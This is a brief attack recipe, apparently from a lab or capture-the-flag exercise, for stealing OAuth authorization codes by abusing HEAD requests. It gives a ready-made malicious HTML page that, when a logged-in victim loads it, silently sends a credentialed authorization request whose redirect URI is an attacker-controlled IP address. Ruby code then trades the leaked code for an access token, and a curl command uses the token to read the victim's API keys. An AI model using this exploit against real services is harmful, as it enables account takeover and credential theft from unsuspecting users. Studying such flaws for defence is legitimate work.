# Create webpage that automatically posts authorization to an app with redirect URI = our server. 
abuses HEAD [write up](https://blog.teddykatz.com/2019/11/05/github-oauth-bypass.html)

bad_page.html
```
<html>
        <body>
        </body>
        <script>
                const authUrl = "http://authorization-ptl-929f8477-75deddee.libcurl.so/oauth/authorize?client_id=cfa9c516120d6f8aa93309379592ddb7b2f5f4453b2069304ec06e0d11f07a4e&redirect_uri=http%3A%2F%2F157.245.250.42&response_type=code"
                fetch(authUrl, { method: 'HEAD', credentials: 'include', mode: 'no-cors'})
                        .catch(err => { throw err; })
                        .then(() => {});
        </script>
</html>
```

Have victim navigate to page after being logged into resource.

bad_page.html automatically submits form to authorization server URI with a mallicious Redirect URI to our server. From here, we see the code= in HTTP headers.

Use code to generate token.

Example in RUBY
``` ruby
require 'oauth2'

callback = "[CALLBACK_URL]"
app_id = "[APPLICATION_ID]"

secret = "[SECRET]"
client = OAuth2::Client.new(app_id, secret, site: "[AUTHORIZATION_SERVER]")
client.auth_code.authorize_url(redirect_uri: callback)


code="[CODE]"
access = client.auth_code.get_token( code, redirect_uri: callback)
access.get("/api/user").parsed

puts access.token  
```

Use token to authenticate to server
```
curl -H 'Authorization: Bearer [TOKEN]' [RESOURCE_SERVER]/api/keys --dump-header -
```

